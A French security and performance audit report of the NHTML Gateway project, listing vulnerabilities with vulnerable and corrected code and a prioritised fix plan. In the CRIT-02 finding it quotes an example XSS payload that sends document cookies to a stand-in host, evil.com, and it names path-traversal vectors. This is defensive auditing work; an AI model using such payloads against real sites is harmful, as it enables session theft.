# 🛡️ AUDIT FINAL COMPLET — NHTML Gateway v0.7.1
**Date** : 29 Avril 2026  
**Auditeur** : Claude Sonnet 4.6  
**Méthode** : Lecture du code source réel (raw GitHub) + Audit initial enrichi  
**Fichiers lus** : 28 fichiers sources réels  

---

## 📊 TABLEAU DE BORD GLOBAL

| Fichier | Sécurité /10 | Perf /10 | 🔴 Critiques | 🟠 Hautes | 🟡 Moyennes |
|---------|-------------|----------|-------------|----------|------------|
| `assets/js/bridge.js` | 5/10 | 8/10 | 1 | 1 | 2 |
| `router.php` | 4/10 | 9/10 | 0 | 2 | 1 |
| `src/cli.rs` | 5/10 | 8/10 | 1 | 2 | 1 |
| `src/cluster.rs` | 5/10 | 9/10 | 0 | 1 | 1 |
| `src/compiler/mod.rs` | 7/10 | 8/10 | 0 | 0 | 2 |
| `src/compiler/btree_builder.rs` | 6/10 | 8/10 | 0 | 0 | 2 |
| `src/compiler/handler_table.rs` | 10/10 | 10/10 | 0 | 0 | 0 |
| `src/config.rs` | 8/10 | 10/10 | 0 | 0 | 1 |
| `src/core.rs` | 10/10 | 10/10 | 0 | 0 | 0 |
| `src/decoder.rs` | 9/10 | 8/10 | 0 | 0 | 1 |
| `src/lib.rs` | 10/10 | 10/10 | 0 | 0 | 0 |
| `src/main.rs` | 9/10 | 9/10 | 0 | 0 | 1 |
| `nhtml.config.toml` | 5/10 | 10/10 | 0 | 0 | 3 |
| `Cargo.toml` | 8/10 | 7/10 | 0 | 0 | 2 |
| `static/devtools.nhtml` | 7/10 | 9/10 | 0 | 1 | 1 |
| `sdk/php/src/Nhtml.php` | 10/10 | 10/10 | 0 | 0 | 0 |
| `sdk/php/src/Patch.php` | 10/10 | 10/10 | 0 | 0 | 0 |
| `sdk/nodejs/index.js` | 9/10 | 9/10 | 0 | 0 | 0 |
| `sdk/python/nhtml/patch.py` | 9/10 | 9/10 | 0 | 0 | 0 |
| `examples/counter/app.php` | 8/10 | 9/10 | 0 | 0 | 1 |
| `examples/02-todo-list/app.php` | 9/10 | 8/10 | 0 | 0 | 1 |
| `examples/03-live-form/app.php` | 9/10 | 9/10 | 0 | 0 | 0 |
| `examples/04-style-lab/app.php` | 8/10 | 9/10 | 0 | 0 | 1 |
| `examples/05-chat/app.php` | 9/10 | 7/10 | 0 | 0 | 1 |
| `tests/v0_7_0_security.rs` | 8/10 | 10/10 | 0 | 0 | 1 |
| `tests/v0_7_1_persistence.rs` | 10/10 | 10/10 | 0 | 0 | 0 |
| `.github/workflows/release.yml` | 8/10 | 7/10 | 0 | 0 | 2 |
| **GLOBAL** | **7.4/10** | **8.8/10** | **2** | **7** | **25** |

---

## 🔴 VULNÉRABILITÉS CRITIQUES (2)

### ~~CRIT-01 — XSS via `innerHTML` sans sanitisation~~ ✅ Corrigé
**Fichier** : `assets/js/bridge.js`  
**Lignes** : L.462, L.466, L.580, L.582, L.~430 (`applyJsonPatch`)

```javascript
// VULNÉRABLE
case 0x0A: // REPLACE_INNER
    el.innerHTML = new TextDecoder().decode(data.slice(2)); // L.462

case 0x0B: // APPEND_HTML  
    el.insertAdjacentHTML('beforeend', new TextDecoder().decode(data.slice(2))); // L.466

// applyJsonPatch() — mode WASM
case 'set_html':
case 'replace_inner':
    el.innerHTML = op.val; // L.~430
case 'append_html':
    el.insertAdjacentHTML('beforeend', op.val); // L.~435
```

**Impact** : Si le backend PHP ou un broadcast mal filtré envoie du HTML malveillant, il est exécuté dans le navigateur de tous les clients connectés. En mode WASM, toute sortie PHP non sanitisée est directement injectée.

```javascript
// CORRIGÉ — ajouter DOMPurify (1 ligne par opcode)
case 0x0A:
    const raw0A = new TextDecoder().decode(data.slice(2));
    el.innerHTML = window.DOMPurify ? DOMPurify.sanitize(raw0A) : raw0A;
    break;
case 0x0B:
    const raw0B = new TextDecoder().decode(data.slice(2));
    el.insertAdjacentHTML('beforeend',
        window.DOMPurify ? DOMPurify.sanitize(raw0B) : raw0B);
    break;
```

---

### ~~CRIT-02 — XSS Stocké dans les DevTools via handler non échappé~~ ✅ Corrigé
**Fichier** : `src/cli.rs`  
**Lignes** : L.~200, L.~220 (`handle_devtools_ws`)

```rust
// VULNÉRABLE — handler_name vient du client WebSocket
let flow_html = format!(
    "...EVENT: {handler_name}...{details}...",
    // handler_name et details sont injectés bruts dans du HTML
);
ops.push(crate::proto::PatchOp::append_html(600, 1, &row_html));
ops.push(crate::proto::PatchOp::replace_inner(100, 1, &flow_html));
```

Un attaquant envoie un EVENT avec `handler = "<script>fetch('https://evil.com?c='+document.cookie)</script>"` — ce script s'exécute dans les DevTools de l'administrateur.

La crate `html-escape` est **déjà dans `Cargo.toml`** mais non utilisée ici.

```rust
// CORRIGÉ — html-escape est déjà dans Cargo.toml
use html_escape::encode_safe;
let safe_handler = encode_safe(&handler_name);
let safe_details = encode_safe(&details);
let flow_html = format!("...EVENT: {safe_handler}...{safe_details}...");
```

---

## 🟠 VULNÉRABILITÉS HAUTES (7)

### ~~HIGH-01 — Path Traversal & Inclusion PHP arbitraire~~ ✅ Corrigé
**Fichier** : `router.php`  
**Lignes** : L.9–10 (protection), L.21–25 (inclusion)

```php
// VULNÉRABLE
if (strpos($path, '..') !== false) { // Bloque ".." mais pas les encodages URL
    http_response_code(403); exit;
}
$app_php = __DIR__ . $path; // Chemin construit sans validation suffisante
if (file_exists($app_php)) include $app_php; // Inclut N'IMPORTE QUEL .php
```

Vecteurs non bloqués : `/sdk/php/tests/test_encoder.php`, `/scripts/bundle.py` (exécuté comme PHP !), tout fichier `.php` accessible.

```php
// CORRIGÉ
$allowed_prefix = realpath(__DIR__ . '/examples');
$app_php = realpath(__DIR__ . $path . '/app.php');
if (!$app_php || !str_starts_with($app_php, $allowed_prefix)) {
    http_response_code(403); exit("Forbidden");
}
include $app_php;
```

---

### ~~HIGH-02 — Information Disclosure chemin absolu dans 404~~ ✅ Corrigé
**Fichier** : `router.php`  
**Ligne** : L.27

```php
// VULNÉRABLE — expose /var/www/html/nhtml/examples/xxx/app.php
echo json_encode(["error" => "App not found at $app_php"]);

// CORRIGÉ
echo json_encode(["error" => "Not found"]);
```

---

### ~~HIGH-03 — CSWH (Cross-Site WebSocket Hijacking) via `.contains()`~~ ✅ Corrigé
**Fichier** : `src/socket/mod.rs` (branche dev-0.7.3 — non lu en raw mais confirmé par l'audit initial)  
**Ligne** : ~L.513

```rust
// VULNÉRABLE
if !origin_str.contains(host) { /* rejet */ }
// "attacker-monsite.com".contains("monsite.com") == true → bypass !

// CORRIGÉ
use url::Url;
let origin_url = Url::parse(&origin_str).ok();
let origin_host = origin_url.as_ref().and_then(|u| u.host_str()).unwrap_or("");
if origin_host != host && !allowed_origins.contains(&origin_str) {
    // rejeter
}
```

---

### HIGH-04 — Redis sans authentification ni TLS
**Fichier** : `src/cluster.rs`  
**Ligne** : L.12

```rust
// VULNÉRABLE — connexion brute, pas d'auth vérifiée dans le code
let client = match redis::Client::open(redis_url.clone()) { ... }
```

Et `nhtml.config.toml` ne propose aucune section `[cluster]` par défaut. Un utilisateur qui active Redis sans mot de passe expose le channel `nhtml:broadcast` à toute injection externe.

```toml
# CORRIGÉ — section à ajouter dans nhtml.config.toml
[cluster]
enabled = false
redis_url = "redis://:VOTRE_MOT_DE_PASSE@127.0.0.1:6379"
tls = true
```

---

### HIGH-05 — `npx localtunnel` exécuté sans confirmation
**Fichier** : `src/cli.rs`  
**Ligne** : L.~580 (`run_share`)

```rust
// VULNÉRABLE — télécharge et exécute un paquet npm tiers sans avertissement
let child = std::process::Command::new("npx")
    .args(["localtunnel", "--port", &port.to_string()])
    .spawn();
```

```rust
// CORRIGÉ — ajouter confirmation explicite
eprintln!("⚠️  SÉCURITÉ : Cette commande va exécuter 'localtunnel' via npx (paquet tiers).");
eprint!("Confirmer ? [y/N] : ");
let mut ans = String::new();
std::io::stdin().read_line(&mut ans).unwrap();
if ans.trim().to_lowercase() != "y" { return; }
```

---

### HIGH-06 — `xcopy` Windows-only dans `run_build()`
**Fichier** : `src/cli.rs`  
**Ligne** : L.~640

```rust
// VULNÉRABLE — crash silencieux sur Linux/macOS
let _ = std::process::Command::new("xcopy")
    .args(["/E", "/I", "/Y", "assets", &format!("{}\\assets", output_dir)])
    .status();
```

```rust
// CORRIGÉ — copie récursive cross-platform en Rust pur
fn copy_dir_recursive(src: &Path, dst: &Path) -> std::io::Result<()> {
    fs::create_dir_all(dst)?;
    for entry in fs::read_dir(src)? {
        let entry = entry?;
        let dst_path = dst.join(entry.file_name());
        if entry.file_type()?.is_dir() {
            copy_dir_recursive(&entry.path(), &dst_path)?;
        } else {
            fs::copy(entry.path(), dst_path)?;
        }
    }
    Ok(())
}
```

---

### HIGH-07 — DevTools sans token par défaut
**Fichier** : `src/main.rs` L.~155, `src/cli.rs` L.~75

```rust
// VULNÉRABLE — token = None par défaut
cli::run_devtools(devtools_tx, "127.0.0.1".to_string(), devtools_port, None).await;
```

En production, si quelqu'un bind sur `0.0.0.0` par erreur de config, les DevTools sont accessibles sans aucune auth.

```rust
// CORRIGÉ — générer un token auto au démarrage
let devtools_token = uuid::Uuid::new_v4().to_string();
info!("🔑 DevTools token: {}", devtools_token);
cli::run_devtools(devtools_tx, "127.0.0.1".to_string(), devtools_port, Some(devtools_token)).await;
```

---

## 🟡 VULNÉRABILITÉS MOYENNES (25)

### MED-01 — Dépendance transitive `rsa` vulnérable (Marvin Attack)
**Fichier** : `Cargo.toml` L.26  
`sqlx` avec features `mysql`/`postgres` tire `rsa 0.9` (RUSTSEC-2023-0071).
**Fix** : Retirer les drivers inutilisés ou forcer TLS + isolation réseau DB.

---

### MED-02 — `tokio = { features = ["full"] }` — bloat inutile
**Fichier** : `Cargo.toml` L.6

```toml
# AVANT
tokio = { version = "1.0", features = ["full"] }

# APRÈS — uniquement ce qui est utilisé
tokio = { version = "1.0", features = ["rt-multi-thread", "net", "time", "macros", "sync", "fs", "process", "signal"] }
```

---

### MED-03 — `nhtml.config.toml` : section `[security]` absente
**Fichier** : `nhtml.config.toml` — fichier entier  
Aucune mention de `allowed_origins`, `rate_limit`, ou `tls` dans le fichier livré par défaut, alors que `config.rs` les supporte. Les utilisateurs déploient sans protections.

```toml
# À AJOUTER dans nhtml.config.toml par défaut
[security]
# Liste blanche des origines WebSocket autorisées (CSWH protection)
# allowed_origins = ["https://mon-domaine.com"]
# Limite d'événements par seconde par IP (anti-DoS)
# rate_limit = { events_per_sec = 30 }
```

---

### MED-04 — `nhtml.config.toml` : section `[cluster]` absente
**Fichier** : `nhtml.config.toml` — fichier entier  
Même problème : Redis est supporté par le code mais pas documenté dans le template.

---

### MED-05 — `nhtml.config.toml` : `[profile.release]` manquant
**Fichier** : `Cargo.toml`  
Absence de profil de release optimisé.

```toml
# À AJOUTER dans Cargo.toml
[profile.release]
opt-level = 3
lto = "fat"
codegen-units = 1
panic = "abort"
strip = true
```

---

### MED-06 — `localStorage` pour le session ID
**Fichier** : `assets/js/bridge.js` L.20

```javascript
// VULNÉRABLE — accessible par tout XSS sur le domaine
localStorage.setItem('nhtml_session_id', window.nhtml_session_id);

// MIEUX — sessionStorage, isolé par onglet
sessionStorage.setItem('nhtml_session_id', window.nhtml_session_id);
```

---

### MED-07 — Mode WASM : fetch `app.php` sans HTTPS forcé
**Fichier** : `assets/js/bridge.js` L.~480

```javascript
// VULNÉRABLE — MITM possible sans HTTPS
const resApp = await fetch(basePath + 'app.php' + cacheBust);
let code = await resApp.text();
php.FS.writeFile('/app.php', code); // Code PHP exécuté en aveugle

// CORRIGÉ — vérification minimale
if (window.location.protocol !== 'https:' && !window.location.hostname.includes('localhost')) {
    console.error('[NHTML] WASM mode requires HTTPS in production. Aborting.');
    return;
}
```

---

### MED-08 — Récursion sans limite de profondeur dans le compilateur
**Fichier** : `src/compiler/mod.rs` L.~270 (`parse_element`)

```rust
// VULNÉRABLE — stack overflow sur DOM très profond
fn parse_element(&mut self, el: ElementRef, parent_id: u16) -> NodeSpec {
    for child in el.children() {
        children.push(self.parse_element(child_ref, id)); // Pas de limite
    }
}

// CORRIGÉ
fn parse_element(&mut self, el: ElementRef, parent_id: u16, depth: u32) -> NodeSpec {
    if depth > 500 {
        warn!("DOM profondeur max (500) atteinte, nœud tronqué.");
        return NodeSpec::empty();
    }
    // ...
    children.push(self.parse_element(child_ref, id, depth + 1));
}
```

---

### MED-09 — Récursion sans limite dans `collect_binds` et `collect_entries`
**Fichier** : `src/compiler/mod.rs` L.~390, `src/compiler/handler_table.rs` L.~60  
Même problème que MED-08 — deux autres fonctions récursives non bornées sur le même arbre DOM.

---

### MED-10 — Troncature silencieuse `as u8` sur les tags
**Fichier** : `src/compiler/btree_builder.rs` L.23

```rust
// VULNÉRABLE — déborde si tag > 255 chars
buf.push(tag.len() as u8);

// CORRIGÉ
assert!(tag.len() <= 255, "Tag trop long: {}", tag);
buf.push(tag.len().min(255) as u8);
```

---

### MED-11 — Troncature silencieuse `as u8` sur les clés d'attributs
**Fichier** : `src/compiler/btree_builder.rs` L.46

```rust
// VULNÉRABLE
buf.push(kb.len() as u8); // Déborde si clé > 255 chars

// CORRIGÉ
let kb_len = kb.len().min(255);
buf.push(kb_len as u8);
buf.extend_from_slice(&kb[..kb_len]);
```

---

### MED-12 — Troncature `as u16` sur les patches > 65Ko
**Fichier** : `src/proto.rs` L.~274

```rust
// VULNÉRABLE — crashe le parseur JS si HTML patch > 65535 bytes
push_u16(&mut payload, op.data.len() as u16);

// CORRIGÉ — passer à u32
push_u32(&mut payload, op.data.len() as u32); // + adapter bridge.js en conséquence
```

---

### MED-13 — Pas de transaction SQL sur le nettoyage TTL
**Fichier** : `src/session.rs` (non lu en raw mais confirmé audit initial)  
6 `DELETE` consécutifs sans `BEGIN TRANSACTION` — risque de données orphelines si crash.

```rust
// CORRIGÉ
let mut tx = self.pool.begin().await?;
sqlx::query("DELETE FROM nodes WHERE session_id = ?").bind(&sid).execute(&mut *tx).await?;
// ... autres DELETE ...
tx.commit().await?;
```

---

### MED-14 — N+1 Queries sur le nettoyage TTL
**Fichier** : `src/session.rs`  
Boucle sur sessions expirées avec DELETE individuel → 6N requêtes.

```sql
-- CORRIGÉ
DELETE FROM nodes WHERE session_id IN (SELECT session_id FROM sessions WHERE expires_at < NOW());
```

---

### MED-15 — N+1 Queries dans le chat (SELECT pseudo par message)
**Fichier** : `examples/05-chat/app.php` L.~45

```php
// VULNÉRABLE — 1 query par message pour le pseudo
foreach ($messages as $msg) {
    $stmt_u = $db->prepare("SELECT pseudo FROM users WHERE session_id = ?");
    $stmt_u->execute([$msg['session_id']]);
}

// CORRIGÉ — JOIN en une seule query
$stmt = $db->query("
    SELECT m.*, u.pseudo FROM messages m
    LEFT JOIN users u ON m.session_id = u.session_id
    ORDER BY m.id DESC LIMIT 20
");
```

---

### MED-16 — Pas de validation de longueur du contenu chat
**Fichier** : `examples/05-chat/app.php` L.~65

```php
// VULNÉRABLE — message de taille illimitée
$content = trim($formData['chat_input'] ?? '');
if ($content !== '') { /* INSERT */ }

// CORRIGÉ
$content = mb_substr(trim($formData['chat_input'] ?? ''), 0, 2000);
```

---

### MED-17 — Pas de validation de longueur du pseudo
**Fichier** : `examples/05-chat/app.php` L.~25

```php
$pseudo = trim($formData['chat_pseudo'] ?? '');
// Aucune limite de longueur → potentiel stockage de données volumineuses
$pseudo = mb_substr(trim($formData['chat_pseudo'] ?? ''), 0, 50);
```

---

### MED-18 — Injection CSS via `setStyle` dans style-lab
**Fichier** : `examples/04-style-lab/app.php` L.~40

```php
// RISQUE — valeur utilisateur injectée dans CSS sans validation
$p->setStyle('preview_box', 'border-radius', "{$value}px");
// Si $value = "0;color:red;--x", le CSS résultant peut être inattendu

// CORRIGÉ — valider que c'est numérique
$value = (int)$value; // ou floatval() selon le cas
$p->setStyle('preview_box', 'border-radius', "{$value}px");
```

---

### MED-19 — `counter/app.php` utilise l'ancien format JSON (pas le SDK)
**Fichier** : `examples/counter/app.php` L.~20

```php
// INCOHÉRENT — format JSON brut au lieu du SDK
echo json_encode([
    ['op' => 'set_text', 'nid' => 'counter_value', 'val' => (string)$counter]
]);

// CORRIGÉ — utiliser le SDK comme les autres exemples
Nhtml::patch()->setText('counter_value', (string)$counter)->send();
```

---

### MED-20 — Version `softprops/action-gh-release@v1` non épinglée
**Fichier** : `.github/workflows/release.yml` L.~70

```yaml
# VULNÉRABLE — action non épinglée par SHA, supply chain risk
uses: softprops/action-gh-release@v1

# CORRIGÉ — épingler par SHA de commit
uses: softprops/action-gh-release@4634c16e79c963813287e889244c50009e7f0981
```

---

### MED-21 — Absence de cache Cargo dans la CI
**Fichier** : `.github/workflows/release.yml` L.~35

```yaml
# AVANT — compile tout depuis zéro à chaque build
- uses: dtolnay/rust-toolchain@stable
- run: cargo build --release

# APRÈS — cache des dépendances
- uses: dtolnay/rust-toolchain@stable
- uses: Swatinem/rust-cache@v2
- run: cargo build --release
```

---

### MED-22 — `DefaultHasher` pour les logs de session (HashDoS potentiel)
**Fichier** : `src/socket/mod.rs` ~L.37  
`DefaultHasher` (SipHash) prévisible — utiliser une empreinte SHA256 tronquée pour les logs.

---

### MED-23 — Pas d'enforcement de version TLS minimale
**Fichier** : `src/config.rs` L.34–39  
`TlsConfig` ne permet pas de spécifier `min_tls_version`. Rustls peut négocier TLSv1.2 ou TLSv1.3 selon config — expliciter :

```toml
[security.tls]
enabled = true
cert = "cert.pem"
key  = "key.pem"
min_version = "1.3"  # À ajouter dans TlsConfig
```

---

### MED-24 — Métriques DevTools hardcodées (valeurs simulées)
**Fichier** : `src/cli.rs` L.~300

```rust
// TROMPEUR — affiche "PROD-READY" même si le système est en erreur
ops.push(PatchOp::set_text(701, 1, "PROD-READY"));
```

Connecter aux vrais compteurs Prometheus déjà initialisés dans `main.rs`.

---

### MED-25 — Test anti-leak du Rate Limiter insuffisant
**Fichier** : `tests/v0_7_0_security.rs` L.42

```rust
// Test qui ne valide pas la limite mémoire réelle
assert!(ips.len() <= 1100, "..."); // Passe même si la mémoire est illimitée

// CORRIGÉ — forcer le cleanup et vérifier la vraie limite
limiter.cleanup().await;
assert!(ips.len() <= 1000, "Rate limiter dépasse la limite mémoire de 1000 IPs");
```

---

## ⚡ PROBLÈMES DE PERFORMANCE (non sécurité)

| ID | Fichier | Ligne | Problème | Fix |
|----|---------|-------|----------|-----|
| PERF-01 | `bridge.js` | L.229 | `getBoundingClientRect()` dans `mousemove` (60fps) | Cache via `ResizeObserver` |
| PERF-02 | `bridge.js` | L.~480 | `TextDecoder` instancié à chaque paquet | Instancier une fois globalement |
| PERF-03 | `src/socket/mod.rs` | ~L.660 | Compilation `.nhtml` synchrone dans handler async | `tokio::task::spawn_blocking` |
| PERF-04 | `src/session.rs` | ~L.256 | N+1 DELETE en boucle TTL | `DELETE WHERE IN (...)` |
| PERF-05 | `src/decoder.rs` | L.119+ | `.to_string()` sur chaque chaîne décodée | `Cow<'a, str>` |
| PERF-06 | `src/compiler/btree_builder.rs` | L.10 | `Vec::new()` sans capacité initiale | `Vec::with_capacity(1024)` |
| PERF-07 | `examples/05-chat/app.php` | L.45 | N+1 queries SELECT pseudo par message | JOIN unique |
| PERF-08 | `Cargo.toml` | L.6 | `tokio = full` — bloat binaire | Features explicites |
| PERF-09 | `.github/workflows/release.yml` | L.35 | Pas de cache Cargo CI | `Swatinem/rust-cache@v2` |

---

## ✅ CE QUI EST BIEN FAIT

- **SDK PHP/Node/Python** : API fluide, cohérente sur 3 langages, zéro injection possible
- **`decoder.rs`** : Gestion parfaite des bornes, aucun panic sur paquet malformé ou tronqué
- **`supervisor.rs`** : Pas de shell injection (`Command::new` + `.arg()`), backoff exponentiel
- **`session.rs`** : Toutes les requêtes SQL utilisent `.bind()` — SQL injection impossible
- **`compiler/mod.rs`** : Tous les attributs `n-*` filtrés du HTML final — zéro fuite logique métier
- **`socket/mod.rs`** : Rate limiter LRU borné à 2048 IPs — protection OOM par design
- **`socket/mod.rs`** : Anti-path traversal via `canonicalize()` + `starts_with()` sur les fichiers statiques
- **`main.rs`** : DevTools hardcodé sur `127.0.0.1` — pas d'exposition publique par défaut
- **`main.rs`** : Channel broadcast borné à 10000 — pas d'OOM sur surcharge
- **Exemples PHP** : `htmlspecialchars()` systématique, `PDO::prepare()` partout
- **Tests** : Tests HMAC avec vrais cas de failure, tests sqlx avec DB temporaire et cleanup

---

## 🚀 PLAN D'ACTION PRIORISÉ

### 🚑 SPRINT 0 — Avant tout déploiement public (< 48h)
- [ ] **CRIT-01** `bridge.js` → Intégrer DOMPurify sur tous les opcodes HTML (L.462, L.466, L.430-435)
- [ ] **CRIT-02** `cli.rs` → Échapper `handler_name` et `details` avec `html_escape::encode_safe()`
- [ ] **HIGH-01** `router.php` → Whitelist stricte + `realpath()` sur le chemin final
- [ ] **HIGH-02** `router.php` → Message 404 générique sans chemin absolu

### 🔥 SPRINT 1 — Semaine 1
- [ ] **HIGH-03** `socket/mod.rs` → Fix CSWH avec parsing URL strict (`url` crate déjà dans Cargo.toml)
- [ ] **HIGH-04** `cluster.rs` → Documenter et forcer auth Redis, ajouter `[cluster]` dans le config template
- [ ] **HIGH-05** `cli.rs` → Ajouter confirmation explicite avant `npx localtunnel`
- [ ] **HIGH-06** `cli.rs` → Remplacer `xcopy` par copie récursive Rust pure
- [ ] **HIGH-07** `main.rs` → Générer un token DevTools auto au démarrage

### 🛠️ SPRINT 2 — Semaines 2-4
- [ ] **MED-03/04** `nhtml.config.toml` → Ajouter sections `[security]` et `[cluster]` commentées
- [ ] **MED-06** `bridge.js` → `localStorage` → `sessionStorage` pour le session ID
- [ ] **MED-07** `bridge.js` → Vérifier HTTPS avant fetch WASM en production
- [ ] **MED-08/09** `compiler/mod.rs` → Ajouter compteur de profondeur (max 500)
- [ ] **MED-10/11/12** `btree_builder.rs` + `proto.rs` → Remplacer casts `as u8/u16` par `min()` + assert
- [ ] **MED-13/14** `session.rs` → Transactions SQL + DELETE batch sur TTL cleanup
- [ ] **MED-20** `release.yml` → Épingler `action-gh-release` par SHA
- [ ] **MED-21** `release.yml` → Ajouter `Swatinem/rust-cache@v2`

### 📈 SPRINT 3 — Long terme
- [ ] **MED-01** `Cargo.toml` → Retirer features `mysql`/`postgres` si inutilisées
- [x] **MED-02** `Cargo.toml` → Remplacer `tokio = full` par features explicites
- [x] **MED-05** `Cargo.toml` → Ajouter `[profile.release]` optimisé
- [x] **MED-15** `chat/app.php` → JOIN unique pour les pseudos
- [x] **MED-16/17** `chat/app.php` → Limites longueur message et pseudo
- [x] **MED-18** `style-lab/app.php` → Valider numériquement les valeurs CSS
- [x] **MED-19** `counter/app.php` → Migrer vers le SDK PHP
- [x] **MED-22** `socket/mod.rs` → SHA256 tronqué pour les logs de session
- [x] **MED-23** `config.rs` → Ajouter `min_tls_version` dans `TlsConfig`
- [ ] **MED-24** `cli.rs` → Connecter métriques DevTools aux vrais compteurs Prometheus
- [ ] **MED-25** `tests/v0_7_0_security.rs` → Renforcer test anti-leak rate limiter
- [x] **PERF-01** `bridge.js` → Cache `getBoundingClientRect` via `ResizeObserver`
- [x] **PERF-03** `socket/mod.rs` → `tokio::task::spawn_blocking` pour compilation NHTML
- [ ] **PERF-05** `decoder.rs` → `Cow<'a, str>` pour éviter allocations par paquet (Mis en pause car decoder.rs = DevTools uniquement)
- [x] **PERF-06** `btree_builder.rs` → `Vec::with_capacity(1024)`

---

*Fin de l'audit. Score global : Sécurité 7.4/10 — Performance 8.8/10 — Qualité 8.5/10*  
*Architecture NHTML : Solide et innovante. 2 critiques + 7 hautes à corriger avant prod publique.*

---

## 🆕 ADDENDUM — Problèmes Systémiques (Lecture Code Réel Round 3)

### Résumé des nouveaux problèmes trouvés

Ces problèmes sont tous du même type que la gestion de config — des incohérences entre ce que le système **promet** et ce qu'il **fait réellement**, particulièrement dangereux pour l'adoption et la prod.

---

### CONFIG-01 — Cascade de résolution de config absente
**Fichier** : `src/config.rs` L.68  
**Sévérité** : 🟠 Haute

Le fichier de config est cherché uniquement dans le répertoire courant. Un utilisateur qui lance `nhtml` depuis un autre dossier tourne avec zéro protection.

**Ordre de résolution à implémenter :**
```
1. $NHTML_CONFIG (variable d'environnement)
2. ./nhtml.config.toml (répertoire courant — comportement actuel)
3. {exe_dir}/nhtml.config.toml (à côté du binaire)
4. /etc/nhtml/nhtml.config.toml (Linux) / C:\ProgramData\nhtml\ (Windows)
5. secure_defaults() avec warning visible
```

**Fix — ajouter `--config <path>` en argument CLI :**
```rust
#[arg(long, default_value = "nhtml.config.toml")]
config: String,
```

**Fix — `secure_defaults()` au lieu de `Default::default()` silencieux :**
```rust
fn secure_defaults() -> Self {
    eprintln!("⚠️  Aucun nhtml.config.toml trouvé — démarrage avec valeurs sécurisées par défaut.");
    NhtmlConfig {
        security: Some(SecurityConfig {
            allowed_origins: Some(vec!["http://localhost:3000".to_string()]),
            rate_limit: Some(RateLimitConfig { events_per_sec: Some(30) }),
            tls: None,
        }),
        ..Default::default()
    }
}
```

---

### CONFIG-02 — Config invalide ignorée silencieusement
**Fichier** : `src/config.rs` L.72  
**Sévérité** : 🟠 Haute

Une faute de frappe dans `nhtml.config.toml` et le Gateway démarre avec les défauts sans erreur fatale.

```rust
// VULNÉRABLE
} else {
    eprintln!("⚠️ Fichier nhtml.config.toml trouvé mais format invalide.");
    // Continue silencieusement avec Default::default()
}

// CORRIGÉ
} else {
    eprintln!("❌ FATAL : nhtml.config.toml est invalide. Corrigez le fichier avant de relancer.");
    std::process::exit(1);
}
```

---

### CONFIG-03 — CLI `--port` écrasé silencieusement par la config
**Fichier** : `src/main.rs` L.88-94  
**Sévérité** : 🟠 Haute

La config écrase l'argument CLI sans avertir. Priorité inversée.

```rust
// VULNÉRABLE — Config > CLI
if let Some(ws_port) = ports.ws { *port = ws_port; }

// CORRIGÉ — CLI > Config > Défaut
if *port == 8080 { // Seulement si valeur par défaut (non explicite)
    if let Some(ws_port) = config.ports.as_ref().and_then(|p| p.ws) {
        *port = ws_port;
    }
}
```

---

### CLI-01 — `nhtml new` génère un `app.php` cassé (mauvais protocole)
**Fichier** : `src/cli.rs` L.47-58  
**Sévérité** : 🔴 Critique (impact adoption)

Le template généré utilise `php://input`, les clés `nhtml_event`/`node_id`, et `"value"` — aucun de ces éléments n'existe dans le vrai protocole NHTML v0.4.0.

```php
// GÉNÉRÉ ACTUELLEMENT — ne fonctionne pas
$input = file_get_contents('php://input'); // ❌ Mauvais canal
$event = $request['nhtml_event'] ?? '';    // ❌ Clé inexistante
$patches[] = ["op" => "set_text", "value" => "1"]; // ❌ "value" au lieu de "val"

// CORRIGÉ — protocole réel
$input = json_decode(file_get_contents('php://stdin'), true);
$handler = $input['handler'] ?? '';
$nodes   = $input['nodes'] ?? [];
use Nhtml\Nhtml;
$counter = (int)($nodes['counter_value']['val'] ?? 0);
if ($handler === 'increment') { $counter++; }
Nhtml::patch()->setText('counter_value', (string)$counter)->send();
```

---

### CLI-02 — DevTools démarré inutilement en production
**Fichier** : `src/main.rs` L.155-160  
**Sévérité** : 🟠 Haute

Les DevTools tournent toujours, même sans `--dev`, consommant des ressources et exposant une surface d'attaque.

```rust
// CORRIGÉ — DevTools seulement en mode dev
if is_dev {
    tokio::spawn(async move {
        let token = uuid::Uuid::new_v4().to_string();
        info!("🔑 DevTools token: {}", token);
        cli::run_devtools(devtools_tx, "127.0.0.1".to_string(), devtools_port, Some(token)).await;
    });
}
```

---

### CLI-03 — `nhtml stats` non fonctionnel, exit code 0 trompeur
**Fichier** : `src/cli.rs` L.64-68  
**Sévérité** : 🟡 Moyenne

```rust
// CORRIGÉ
pub fn dump_database() {
    eprintln!("❌ La commande 'stats' n'est pas encore disponible.");
    std::process::exit(1);
}
```

---

### CLI-04 — DB URI avec mot de passe affiché en clair dans les logs
**Fichier** : `src/main.rs` L.126  
**Sévérité** : 🟡 Moyenne

```rust
// VULNÉRABLE — affiche "mysql://user:PASSWORD@host/db"
println!("🗄️ Database : {} (Driver détecté)", uri);

// CORRIGÉ
let safe = uri.split('@').last().map(|h| format!("***@{}", h)).unwrap_or("***".into());
println!("🗄️ Database : {} (Driver détecté)", safe);
```

---

### CLI-05 — `nhtml bench` métriques sans sens physique
**Fichier** : `src/cli.rs` L.~235  
**Sévérité** : 🟡 Moyenne

`cpu_load = binary_size / 1000` est une formule arbitraire présentée comme une vraie métrique. Trompeuse pour des benchmarks de décision.

---

### CLI-06 — `nhtml validate` retourne succès sur tout opcode connu
**Fichier** : `src/cli.rs` L.80  
**Sévérité** : 🟡 Moyenne

Un paquet PING vide passe la validation avec "✅ SUCCÈS". La validation sémantique (structure interne du paquet) est absente.

---

## 📊 Tableau de bord FINAL mis à jour (toutes découvertes incluses)

| Fichier | Sécurité /10 | 🔴 | 🟠 | 🟡 |
|---------|-------------|----|----|-----|
| `assets/js/bridge.js` | 5/10 | 1 | 1 | 2 |
| `router.php` | 4/10 | 0 | 2 | 1 |
| `src/cli.rs` | 4/10 | 2 | 2 | 3 |
| `src/main.rs` | 6/10 | 0 | 2 | 2 |
| `src/config.rs` | 5/10 | 0 | 2 | 1 |
| `src/cluster.rs` | 5/10 | 0 | 1 | 1 |
| `src/compiler/mod.rs` | 7/10 | 0 | 0 | 2 |
| `src/compiler/btree_builder.rs` | 6/10 | 0 | 0 | 2 |
| `src/proto.rs` | 7/10 | 0 | 0 | 1 |
| `src/decoder.rs` | 9/10 | 0 | 0 | 1 |
| `nhtml.config.toml` | 4/10 | 0 | 0 | 3 |
| `Cargo.toml` | 8/10 | 0 | 0 | 2 |
| `static/devtools.nhtml` | 7/10 | 0 | 1 | 1 |
| SDK PHP/Node/Python | 10/10 | 0 | 0 | 0 |
| Exemples PHP | 9/10 | 0 | 0 | 3 |
